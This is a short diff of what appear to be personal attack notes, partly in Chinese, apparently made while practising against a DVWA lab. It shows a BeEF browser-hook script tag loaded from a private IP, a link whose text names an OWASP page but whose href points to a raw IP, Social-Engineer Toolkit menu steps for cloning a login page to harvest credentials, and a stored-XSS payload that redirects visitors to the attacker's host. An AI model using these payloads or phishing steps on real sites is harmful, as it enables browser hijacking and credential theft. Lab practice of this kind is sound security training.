@@ -25,7 +25,14 @@ cookies
 			<a href="http://1.117.162.201/" target="_blank">https://owasp.org/www-community/attacks/xss/</a>
 		beef
 			<script src="http://192.168.100.143:3000/hook.js"></script>
-		
+克隆网站
+	http://xiaoxiaoran.com/dvwa/login.php
+		sudo setoolkit
+			2) Website Attack Vectors
+			3) Credential Harvester Attack Method
+			2) Site Cloner
+	http://xiaoxiaoran.com/dvwa/vulnerabilities/xss_s/
+		<script>window.location="http://192.168.100.143"</script>
 		
 		
 		
